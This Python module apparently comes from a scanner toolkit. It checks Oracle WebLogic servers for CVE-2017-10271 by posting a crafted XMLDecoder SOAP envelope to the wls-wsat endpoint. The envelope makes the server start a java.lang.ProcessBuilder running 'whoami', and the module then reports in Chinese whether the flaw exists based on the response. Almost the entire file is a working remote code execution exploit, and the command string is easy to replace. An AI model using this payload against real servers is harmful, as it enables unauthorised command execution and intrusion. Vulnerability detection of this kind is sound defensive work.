import requests
import time
from bs4 import BeautifulSoup
import logging
import re

uj=''
http = ''
https = ''
headers = {
    'Content-Type': 'text/xml;charset=UTF-8',
    'User-Agent': 'TestUA/1.0'
}

def a2dl15(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global uj
    global http,https
    try:
        proxies = {'http': http,
                   'https': https}
        t_data = ''
        cmd='whoami'
        for i, c in enumerate(cmd.split()):
            t_data += '<void index="{}"><string>{}</string></void>'.format(
                i, c)
        data = '''
            <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
              <soapenv:Header>
                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                  <java>
                    <void class="java.lang.ProcessBuilder">
                      <array class="java.lang.String" length="2">
                        {}
                      </array>
                      <void method="start"/>
                    </void>
                  </java>
                </work:WorkContext>
              </soapenv:Header>
              <soapenv:Body/>
            </soapenv:Envelope>
            '''.format(t_data)
        logging.captureWarnings(True)
        aa = requests.post(url1+'/wls-wsat/CoordinatorPortType',data=data,headers=headers,cookies=s_cookie,proxies=proxies,verify=False, timeout=5)
        if aa != None and ('<faultstring>java.lang.ProcessBuilder' in aa.text or "<faultstring>0" in aa.text):
            uj='[+]漏洞存在\n'
        else:
            uj='[-]漏洞不存在\n'
    except Exception as aaa:
        uj='[-]请求错误\n'+str(aaa)
def a2jg85():
    global uj
    return '--------------------------------------------------\n[ Weblogic(CVE-2017-10271) ]\n\n'+ str (uj)+'\n'
def a2u85(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)
